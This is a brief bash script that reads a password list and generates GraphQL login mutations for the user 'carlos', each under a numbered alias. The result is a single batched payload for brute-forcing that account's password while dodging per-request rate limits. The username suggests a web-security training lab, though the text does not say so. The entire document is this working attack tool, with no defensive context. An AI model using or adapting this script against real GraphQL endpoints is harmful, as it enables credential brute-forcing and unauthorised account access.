#!/bin/bash

text='''
intento_x: login(input: {username: "carlos", password: "bg3z"}) {\n
\ttoken\n
\tsuccess\n
}
'''

counter=1
cat passwords | while read password; do
    echo -e $text | sed "s/bg3z/$password/" | sed "s/intento_x/intento_$counter/"
    
    let counter+=1
done
